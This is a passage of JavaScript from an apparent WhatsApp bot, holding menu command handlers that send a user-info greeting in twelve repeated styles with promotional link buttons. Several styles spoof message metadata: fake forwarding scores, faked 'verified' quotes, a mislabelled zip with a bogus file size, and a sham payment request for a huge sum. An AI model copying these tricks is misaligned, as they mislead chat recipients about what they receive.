}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'ownermenu': {
            		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'othermenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner ??","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'downloadmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
